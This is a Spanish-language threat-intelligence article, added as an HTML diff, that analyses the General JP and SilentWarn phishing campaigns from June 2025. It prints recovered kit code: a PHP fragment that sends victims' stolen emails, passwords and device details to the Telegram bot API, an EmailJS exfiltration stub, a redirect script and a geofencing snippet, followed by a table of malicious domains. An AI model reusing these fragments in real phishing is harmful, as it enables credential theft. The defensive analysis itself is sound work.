@@ -1,0 +1,197 @@
+<aside class="tldr">
+  <div class="h">// En 30 segundos</div>
+  <ul>
+    <li>Dos campañas de phishing activas en <b>junio 2025</b>, stacks diferentes, mismas raíces: la <b>Operación General JP</b> (multi-capa, PHP + exfiltración a Telegram) y la <b>Operación SilentWarn</b> (React sobre Cloudflare Pages con EmailJS y geofencing a Vietnam).</li>
+    <li>General JP pivota desde <b>Google Cloud Storage</b> (185.80.129.110) a través de <code>yournextlvlredirect.com</code> → <code>mechatecha1520.com</code> → <code>bestdealzon.art</code>, con correos alimentados por filtraciones (Alien Stealer, Deezer, Zacks2024) y una cadena de redirección que <b>segmenta el destino por perfil de víctima</b>.</li>
+    <li>El kit <code>reservigt.com/japangenerals.zip</code> escribe las credenciales en <code>logins.html</code> (bitácora centralizada) y alerta en tiempo real a <b>Telegram</b> con perfil completo de la víctima (IP, ISP, SO, navegador).</li>
+    <li>SilentWarn exfiltra vía <b>EmailJS + SMTPjs incrustado en el frontend</b>, redirige a Facebook a los visitantes de Vietnam (VN) y bloquea F12/Ctrl+Shift+I — comentarios en vietnamita en el código refuerzan la atribución.</li>
+  </ul>
+</aside>
+
+<details class="toc-card" open>
+  <summary>/generaljp_silentwarn · <span class="tw">6</span> secciones</summary>
+  <ol>
+    <li><a href="#a00">Resumen de inteligencia</a></li>
+    <li><a href="#a01">Operación General JP</a></li>
+    <li><a href="#a02">Operación SilentWarn</a></li>
+    <li><a href="#a03">Correlación y patrones</a></li>
+    <li><a href="#a04">IoCs consolidados</a></li>
+    <li><a href="#a05">Conclusión</a></li>
+  </ol>
+</details>
+
+<h2 id="a00"><span class="idx">01.</span> Resumen de inteligencia</h2>
+<p>En junio de 2025 identifiqué dos campañas de phishing activas que, aunque usan stacks tecnológicos diferentes, comparten patrones de infraestructura y fuentes de datos que sugieren una conexión operativa — o, como mínimo, un ecosistema de atacantes que recicla las mismas listas de correos filtrados. La <b>Operación General JP</b> usa Google Cloud Storage como punto de entrada, una cadena de redirección con dominios intermedios y un kit PHP que exfiltra credenciales por la API de Telegram. La <b>Operación SilentWarn</b> está construida en React con EmailJS y SMTPjs, implementa geofencing para redirigir a usuarios vietnamitas y se aloja en Cloudflare Pages.</p>
+<div class="callout callout-warn"><span class="ico">🛰</span><div>
+  <div class="h">Método y contexto</div>
+  <p>Este artículo conecta ambos casos con la <a href="threat-hunter-recollection.html">Threat Hunter Recollection</a>, la <a href="fakewealth-cmdxcapital.html">Operación FakeWealth</a> y la <a href="pigbutchering-bybsusd.html">red bybsusd.com</a>. El hilo conductor es la metodología: pivotar sobre infraestructura, leer los errores del adversario y correlacionar patrones entre campañas aparentemente independientes. El análisis se realizó desde el entorno blindado documentado en <a href="infraestructura-tunel-ofuscado.html">Infraestructura Ofuscada (WireGuard + proxy residencial)</a> para no alertar a los operadores.</p>
+</div></div>
+
+<h2 id="a01"><span class="idx">02.</span> Operación General JP: phishing multi-capa con exfiltración a Telegram</h2>
+
+<h3>Descubrimiento: URLs en caché y listas filtradas</h3>
+<p>El punto de partida fue una lista de URLs en caché que compartían patrón común usando Google Cloud Storage como infraestructura de entrada. Todas seguían una estructura donde el parámetro <span class="mono">user</span> contenía direcciones obtenidas de filtraciones masivas:</p>
+<div class="code-wrap"><span class="lang">url</span><pre class="code"><code><span class="syn-c"># Patrón de URL identificado en caché</span>
+<span class="syn-n">https://185.80.129.110</span>/public/?:nav=unsuboffre::tracker
+&deploy=<span class="syn-n">2046847</span>
+&user=<span class="syn-s">test%40correo.com</span>
+&email_id=<span class="syn-n">147138100</span></code></pre></div>
+<p>La IP <span class="mono">185.80.129.110</span> está asociada a <span class="mono">storage.googleapis.com</span>. Al consultar los correos del parámetro <span class="mono">user</span> confirmé que todos provenían de tres fuentes principales: logs de <b>Alien Stealer</b>, breaches como <b>Deezer</b> y combolists como <b>Zacks2024</b>. El patrón —reutilizar bases filtradas para alimentar spam— es el mismo documentado en la <a href="threat-hunter-recollection.html">Threat Hunter Recollection</a> (caso Rekrute y ShinyHunters) y en la <a href="fakewealth-cmdxcapital.html">Operación FakeWealth</a>: la filtración de datos se convierte en insumo de fraude masivo años después.</p>
+
+<h3>Cadena de redirección multi-capa</h3>
+<p>El grafo de infraestructura mapea el flujo completo: el tráfico inicia en Google Cloud Storage y salta secuencialmente por múltiples dominios hasta el destino final.</p>
+<figure class="figure">
+  <img src="img/phishing-general-jp-redireccion-infraestructura-grafo.jpg" alt="Grafo de infraestructura de redirección de phishing" loading="lazy">
+  <figcaption class="figcap">Grafo de relaciones — 185.80.129.110 (storage.googleapis.com) → yournextlvlredirect.com → mechatecha1520.com → bestdealzon.art → telemetría hacia trk-quantivex.com y recursos externos.</figcaption>
+</figure>
+<p>El generador de redirección dinámica construía el siguiente destino con JavaScript en función de los parámetros de la URL. El parámetro <span class="mono">encoded_value</span> contenía un Base64 que, decodificado, revelaba el identificador de campaña segmentado:</p>
+<div class="code-wrap"><span class="lang">js</span><pre class="code"><code>document.<span class="syn-f">getElementById</span>(<span class="syn-s">'button1'</span>).<span class="syn-f">addEventListener</span>(<span class="syn-s">"click"</span>, <span class="syn-k">function</span>(){
+    <span class="syn-k">var</span> urlParams = <span class="syn-k">new</span> <span class="syn-f">URLSearchParams</span>(<span class="syn-k">window</span>.location.search);
+    <span class="syn-k">var</span> encodedValue = urlParams.<span class="syn-f">get</span>(<span class="syn-s">'encoded_value'</span>);
+    <span class="syn-k">var</span> domain = urlParams.<span class="syn-f">get</span>(<span class="syn-s">'domain'</span>);
+    <span class="syn-k">var</span> sub1 = urlParams.<span class="syn-f">get</span>(<span class="syn-s">'sub1'</span>);
+    <span class="syn-k">var</span> sub2 = urlParams.<span class="syn-f">get</span>(<span class="syn-s">'sub2'</span>);
+    <span class="syn-k">var</span> sub3 = urlParams.<span class="syn-f">get</span>(<span class="syn-s">'sub3'</span>);
+    <span class="syn-k">var</span> sub4 = urlParams.<span class="syn-f">get</span>(<span class="syn-s">'sub4'</span>);
+    <span class="syn-k">var</span> sub5 = urlParams.<span class="syn-f">get</span>(<span class="syn-s">'sub5'</span>);
+    <span class="syn-k">window</span>.location.href = <span class="syn-s">"https://"</span> + domain + <span class="syn-s">"/cmp/"</span> + encodedValue + <span class="syn-s">"/JMMGSF/?source_id="</span> + <span class="syn-k">…</span>
+}, <span class="syn-k">false</span>);</code></pre></div>
+<p>Dependiendo del perfil de la víctima, el destino final variaba: unos correos llevaban a una falsa página de FedEx, otros a un supuesto portal de noticias canadiense y otros a una inmobiliaria fraudulenta cuya plantilla <b>ni siquiera había sido modificada</b> (dejaron la URL original de descarga). Si se omitía el parámetro, la redirección se frenaba con un mensaje emergente pidiendo el valor faltante. Confirma el diseño: <b>segmentar campañas por perfil de víctima usando el mismo backend</b>.</p>
+
+<h3>El servidor de correo y la Filemail API</h3>
+<p>El envío masivo de spam estaba impulsado por la <b>API de Filemail</b> (<span class="mono">filemail.com</span>), abusada con parámetros ofuscados en strings segmentados reconstruidos en tiempo de ejecución:</p>
+<div class="code-wrap"><span class="lang">http</span><pre class="code"><code><span class="syn-c"># Estructura de la API de Filemail abusada por los atacantes</span>
+<span class="syn-k">POST</span> <span class="syn-s">/api/transfer/complete</span>?logintoken=<span class="syn-s">KDJF9JDF7JFN754H</span>
+      &transferid=<span class="syn-s">HGTUIJBGTRFGJPO</span>
+      &transferkey=<span class="syn-s">3783hf73h783jhdf83j93k</span></code></pre></div>
+<p>El último parámetro de la URL contenía el dominio con el que se disfrazaba el origen (<span class="mono">www.mechatecha1520.com</span>), técnica clásica de email spoofing para evadir filtros antispam.</p>
+<div class="callout callout-warn"><span class="ico">⚙</span><div>
+  <div class="h">Lección: abuso de APIs legítimas</div>
+  <p>Google Cloud Storage (script de redirección), Filemail API (envío de correos) e IPFS (enmascarar la IP del servidor) — el abuso de servicios legítimos es constante en phishing moderno. Mismo patrón que la <a href="fakewealth-cmdxcapital.html">Operación FakeWealth</a> con Cloudflare/Google Cloud/NameCheap. La diferencia aquí: un servidor intermedio en <b>Lituania sin dominio</b> que actuaba como punto de entrega de contenido malicioso y, posiblemente, de malware.</p>
+</div></div>
+
+<h3>El kit «General JP»</h3>
+<p>Uno de los hallazgos más valiosos fue la recuperación de <span class="mono">reservigt.com/japangenerals.zip</span>. La captura muestra el archivo <span class="mono">logins.html</span> renderizado — una bitácora centralizada donde el backend volcaba secuencialmente las credenciales robadas:</p>
+<figure class="figure">
+  <img src="img/phishing-general-jp-bitacora-credenciales-robadas.png" alt="Bitácora de credenciales robadas expuesta en el servidor del atacante" loading="lazy">
+  <figcaption class="figcap">Bitácora de credenciales — Filas separadas por separadores numéricos y de asteriscos: nombres de usuario, contraseñas, IPs de origen, fechas, horas de captura y el User-Agent completo del navegador/SO de la víctima.</figcaption>
+</figure>
+<p>El correo que inicia la cadena suplanta a <b>Meta for Business</b> con una técnica basada en urgencia y miedo ante una supuesta infracción de propiedad intelectual:</p>
+<figure class="figure">
+  <img src="img/phishing-meta-business-correo-senuelo.jpg" alt="Correo de phishing suplantando a Meta for Business" loading="lazy">
+  <figcaption class="figcap">El cebo — Suplanta a Meta (Meta for Business Nexus) alertando de una «Intellectual Property Policy Breach». Remitente de un dominio fraudulento (@sell9proxy.com) ajeno a la infraestructura oficial de Meta, con enlaces camuflados como directrices de cumplimiento hacia el kit de credenciales.</figcaption>
+</figure>
+<p>El backend <span class="mono">next.php</span> era el núcleo: escribía las credenciales en <span class="mono">logins.html</span>, enviaba una alerta real-time por Telegram y redirigía a la víctima al sitio legítimo. Incluía reconocimiento y perfilado del visitante:</p>
+<figure class="figure">
+  <img src="img/phishing-kit-php-exfiltracion-telegram-backend.jpg" alt="Backend PHP del kit de phishing con exfiltración a Telegram" loading="lazy">
+  <figcaption class="figcap">Backend PHP — Variables $user_id y $botToken para Telegram; get_client_ip() con evasión de proxies vía headers HTTP; get_ip_info() consultando ip-api.com; get_device_info() con regex para SO y navegador.</figcaption>
+</figure>
+<div class="code-wrap"><span class="lang">php</span><pre class="code"><code><span class="syn-c">// Mensaje de telemetría enviado a Telegram</span>
+<span class="syn-v">$StyledMessage</span> = <span class="syn-s">"&lt;b&gt;🚨 NEW LOGIN ACCESS&lt;/b&gt;\n"</span>;
+<span class="syn-v">$StyledMessage</span> .= <span class="syn-s">"&lt;b&gt;📧 Email:&lt;/b&gt; &lt;code&gt;$user&lt;/code&gt;\n"</span>;
+<span class="syn-v">$StyledMessage</span> .= <span class="syn-s">"&lt;b&gt;🔐 Password:&lt;/b&gt; &lt;code&gt;$pass&lt;/code&gt;\n"</span>;
+<span class="syn-v">$StyledMessage</span> .= <span class="syn-s">"&lt;b&gt;🌍 IP:&lt;/b&gt; &lt;a href='https://ip-api.com/$ip'&gt;$ip&lt;/a&gt;\n"</span>;
+<span class="syn-v">$StyledMessage</span> .= <span class="syn-s">"&lt;b&gt;🏙 Location:&lt;/b&gt; $city, $region, $country\n"</span>;
+<span class="syn-v">$StyledMessage</span> .= <span class="syn-s">"&lt;b&gt;📡 ISP:&lt;/b&gt; $isp\n"</span>;
+<span class="syn-v">$StyledMessage</span> .= <span class="syn-s">"&lt;b&gt;💻 Device:&lt;/b&gt; $device_os\n"</span>;
+<span class="syn-v">$StyledMessage</span> .= <span class="syn-s">"&lt;b&gt;🌐 Browser:&lt;/b&gt; $browser\n"</span>;
+<span class="syn-v">$StyledMessage</span> .= <span class="syn-s">"&lt;i&gt;📥 Sent from GENERAL JP&lt;/i&gt;"</span>;
+
+<span class="syn-v">$website</span> = <span class="syn-s">"https://api.telegram.org/bot{$botToken}/sendMessage"</span>;
+<span class="syn-v">$params</span> = [
+    <span class="syn-s">'chat_id'</span>      => <span class="syn-v">$user_id</span>,
+    <span class="syn-s">'text'</span>          => <span class="syn-v">$StyledMessage</span>,
+    <span class="syn-s">'parse_mode'</span>    => <span class="syn-s">'HTML'</span>
+];</code></pre></div>
+<div class="callout callout-danger"><span class="ico">⚠</span><div>
+  <div class="h">Exfiltración dual</div>
+  <p>Dos canales: <code>logins.html</code> como almacenamiento persistente en el servidor y la <b>API de Telegram</b> como canal de notificación real-time. Si se encontrara un kit con el token activo —las variables <span class="mono">$user_id</span> y <span class="mono">$botToken</span> estaban vacías en la muestra recuperada—, se podría acceder a todo el historial de víctimas.</p>
+</div></div>
+
+<h2 id="a02"><span class="idx">03.</span> Operación SilentWarn: phishing en React con geofencing vietnamita</h2>
+
+<h3>Descubrimiento y vector de entrada</h3>
+<p>Apenas unas semanas después de General JP, llegó un nuevo correo: remitente <span class="mono">eogagnzgytatmtneaeseof@sell9proxy.com</span> —dominio registrado desde diciembre de 2024 vía <strong>one.com</strong>— y enlace acortado de <b>Rebrandly</b>: <span class="mono">rebrand[.]ly/WebSite22fc63</span>. La campaña tenía poco: la única referencia pública era una denuncia aislada de principios de junio de 2025.</p>
+
+<h3>Infraestructura técnica: React + EmailJS + SMTPjs</h3>
+<p>El enlace redirigía a <span class="mono">silentwarn-2569-formsubmit-[…].pages[.]dev</span> en <b>Cloudflare Pages</b>. El HTML inicial revelaba una aplicación <b>React</b> (Create React App) con <span class="mono">smtpjs.com/v3/smtp.js</span> cargado en el frontend y <b>EmailJS</b> como servicio de exfiltración:</p>
+<div class="code-wrap"><span class="lang">html</span><pre class="code"><code><span class="syn-c">&lt;!-- HTML inicial del sitio SilentWarn --&gt;</span>
+&lt;!doctype html&gt;
+&lt;html lang=<span class="syn-s">"en"</span>&gt;
+&lt;head&gt;
+    &lt;meta name=<span class="syn-s">"robots"</span> content=<span class="syn-s">"noindex, nofollow"</span>/&gt;
+    &lt;title&gt;Meta for Business | Privacy Center&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script src=<span class="syn-s">"https://smtpjs.com/v3/smtp.js"</span>&gt;&lt;/script&gt;
+&lt;/body&gt;</code></pre></div>
+<p>A diferencia de General JP (backend PHP + Telegram), SilentWarn es arquitectura 100% JavaScript: React para el frontend, EmailJS para el envío y SMTPjs como cliente SMTP incrustado — con un sistema de respaldo que conmuta a credenciales secundarias si el servicio principal falla.</p>
+
+<h3>Geofencing: protegiendo al atacante vietnamita</h3>
+<p>El hallazgo más revelador: la app consultaba <span class="mono">get.geojs.io/v1/ip/geo.json</span> y, si la IP era de <b>Vietnam (VN)</b>, redirigía inmediatamente a Facebook:</p>
+<div class="code-wrap"><span class="lang">js</span><pre class="code"><code><span class="syn-f">fetch</span>(<span class="syn-s">"https://get.geojs.io/v1/ip/geo.json"</span>)
+    .<span class="syn-f">then</span>((res) => res.<span class="syn-f">json</span>())
+    .<span class="syn-f">then</span>((data) => {
+        <span class="syn-k">if</span> (data.country_code === <span class="syn-s">"VN"</span>)
+            <span class="syn-k">window</span>.location.href = <span class="syn-s">"https://www.facebook.com/"</span>;
+    })
+    .<span class="syn-f">catch</span>(<span class="syn-k">console</span>.<span class="syn-f">error</span>);</code></pre></div>
+<div class="callout callout-warn"><span class="ico">🎯</span><div>
+  <div class="h">Indicador de atribución</div>
+  <p>Redirigir a los usuarios del país de origen evita que sean víctimas propias y, sobre todo, <b>protege la infraestructura de ser analizada por investigadores locales</b>. Los comentarios en vietnamita dispersos en el código refuerzan la hipótesis. Técnica conceptualmente similar al geofencing de la <a href="pigbutchering-bybsusd.html">red bybsusd.com</a>.</p>
+</div></div>
+<p>Además: <b>bloqueo de DevTools</b> vía event listener para F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C y Ctrl+U, y un <b>splash screen de 6 segundos</b> con video a pantalla completa antes del contenido principal — ofuscación para evadir análisis automatizados.</p>
+
+<h3>Flujo de exfiltración</h3>
+<p>Los datos se enviaban por correo vía <span class="mono">api.emailjs.com</span> tras capturar geolocalización con un iplogger:</p>
+<div class="code-wrap"><span class="lang">js</span><pre class="code"><code><span class="syn-k">const</span> <span class="syn-f">handleSendMailJs</span> = (data) => {
+    <span class="syn-k">const</span> primaryServiceId = <span class="syn-k">process</span>.<span class="syn-k">env</span>.<span class="syn-a">REACT_APP_EMAILJS_SERVICE_ID</span>;
+    <span class="syn-k">const</span> primaryTemplateId = <span class="syn-k">process</span>.<span class="syn-k">env</span>.<span class="syn-a">REACT_APP_EMAILJS_TEMPLATE_ID</span>;
+    <span class="syn-k">const</span> primaryPublicKey = <span class="syn-k">process</span>.<span class="syn-k">env</span>.<span class="syn-a">REACT_APP_EMAILJS_PUBLIC_KEY</span>;
+
+    <span class="syn-k">const</span> backupServiceId  = <span class="syn-k">process</span>.<span class="syn-k">env</span>.<span class="syn-a">REACT_APP_EMAILJS_BACKUP_SERVICE_ID</span>;
+    <span class="syn-k">const</span> backupTemplateId = <span class="syn-k">process</span>.<span class="syn-k">env</span>.<span class="syn-a">REACT_APP_EMAILJS_BACKUP_TEMPLATE_ID</span>;
+    <span class="syn-k">const</span> backupPublicKey  = <span class="syn-k">process</span>.<span class="syn-k">env</span>.<span class="syn-a">REACT_APP_EMAILJS_BACKUP_PUBLIC_KEY</span>;
+
+    <span class="syn-c">// Intenta el servicio primario; si falla, conmuta al backup</span>
+    <span class="syn-k">const</span> apiUrl = <span class="syn-k">process</span>.<span class="syn-k">env</span>.<span class="syn-a">REACT_APP_API_URL</span>;
+};</code></pre></div>
+<p>EmailJS + SMTPjs representan la evolución frente a los kits PHP: <b>toda la lógica de exfiltración reside en el cliente</b>, lo que dificulta el rastreo del backend.</p>
+
+<h2 id="a03"><span class="idx">04.</span> Correlación y patrones</h2>
+<p>Stacks distintos —PHP con Telegram vs React con EmailJS—, pero los patrones las conectan dentro del mismo ecosistema:</p>
+<ul>
+  <li><b>Fuente de correos:</b> ambas usan listas de filtraciones masivas (Alien Stealer, combolists, breaches de plataformas).</li>
+  <li><b>Abuso de infraestructura legítima:</b> Google Cloud Storage y Filemail API (General JP); Cloudflare Pages, EmailJS, SMTPjs y Rebrandly (SilentWarn).</li>
+  <li><b>Geofencing como protección:</b> SilentWarn redirige a vietnamitas; General JP segmenta el destino final por perfil.</li>
+  <li><b>Exfiltración multicanal:</b> Telegram + archivo local (General JP); EmailJS primario + backup (SilentWarn).</li>
+  <li><b>Pereza operacional:</b> plantilla original sin modificar en General JP (hasta el <span class="mono">Untitled.png</span> sin renombrar); comentarios en vietnamita y variables de entorno de EmailJS expuestas en SilentWarn.</li>
+</ul>
+<div class="callout callout-warn"><span class="ico">🔁</span><div>
+  <div class="h">Patrón transversal: infraestructura efímera y reciclaje de datos</div>
+  <p>Dominios baratos (one.com), alojamiento gratuito (Cloudflare Pages, GCS) y exfiltración sobre APIs legítimas. Infraestructura desechable alimentada por bases filtradas — el mismo modelo de la <a href="pigbutchering-bybsusd.html">red bybsusd.com</a> y la <a href="fakewealth-cmdxcapital.html">Operación FakeWealth</a>. La diferencia: estas campañas son más ágiles. Se levantan en días, operan semanas y desaparecen cuando las listas se agotan o los dominios se bloquean.</p>
+</div></div>
+
+<h2 id="a04"><span class="idx">05.</span> IoCs consolidados</h2>
+<div class="tbl-wrap">
+  <table>
+    <thead>
+      <tr><th>Campaña</th><th>Tipo</th><th>Valor</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="mono" rowspan="5">General JP</td><td>IP servidor spam</td><td class="mono">185.80.129.110</td></tr>
+      <tr><td>Dominio redirección</td><td class="mono">yournextlvlredirect.com</td></tr>
+      <tr><td>Dominio redirección</td><td class="mono">mechatecha1520.com</td></tr>
+      <tr><td>Endpoint phishing</td><td class="mono">megalift-bn.xyz/mason/chameleon.php</td></tr>
+      <tr><td>Kit de phishing</td><td class="mono">reservigt.com/japangenerals.zip</td></tr>
+      <tr><td class="mono" rowspan="4">SilentWarn</td><td>Dominio acortador</td><td class="mono">rebrand[.]ly/WebSite22fc63</td></tr>
+      <tr><td>Dominio phishing</td><td class="mono">silentwarn-2569-formsubmit-[…].pages[.]dev</td></tr>
+      <tr><td>Remitente spam</td><td class="mono">@sell9proxy.com</td></tr>
+      <tr><td>Servicio exfiltración</td><td class="mono">api.emailjs.com</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h2 id="a05"><span class="idx">06.</span> Conclusión</h2>
+<p>General JP y SilentWarn representan dos caras del phishing moderno: campañas ágiles, de bajo costo, que abusan de infraestructura legítima y reciclan bases filtradas para maximizar alcance. La diferencia técnica —PHP tradicional vs React con EmailJS— refleja la diversidad de stacks del adversario; los patrones subyacentes son los mismos.</p>
+<p>Para el threat hunter la lección es clara: los IoCs individuales caducan rápido, pero los <b>patrones de infraestructura</b> —abuso de GCS/Cloudflare Pages/APIs de correo, geofencing para proteger al atacante, reutilización de listas filtradas— son atemporales. La detección proactiva debe pivotar sobre patrones, no sobre dominios. Serie completa en la <a href="threat-hunter-recollection.html">Threat Hunter Recollection</a>: la infraestructura es el talón de Aquiles del adversario.</p>
